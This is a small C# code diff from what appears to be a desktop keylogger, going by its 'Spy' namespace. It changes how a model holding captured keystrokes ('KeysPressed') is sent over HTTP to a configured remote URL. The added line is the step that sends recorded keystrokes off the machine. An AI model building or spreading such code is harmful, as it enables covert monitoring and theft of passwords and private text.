@@ -123,9 +123,11 @@ namespace HIT.Desktop.Spy
                         KeysPressed = keysToSend
                     };
 
-                    await this.HttpService.SendAsBson(model,
-                        this.Settings.HttpServiceSettings.BaseAddress, 
-                        this.Settings.HttpServiceSettings.RequestURL);
+                    //await this.HttpService.SendAsBson(model,
+                    //    this.Settings.HttpServiceSettings.BaseAddress, 
+                    //    this.Settings.HttpServiceSettings.RequestURL);
+
+                    await this.HttpService.SendAsBson(model, this.Settings.RequestUrl);
                 }
                 catch (Exception exc)
                 {
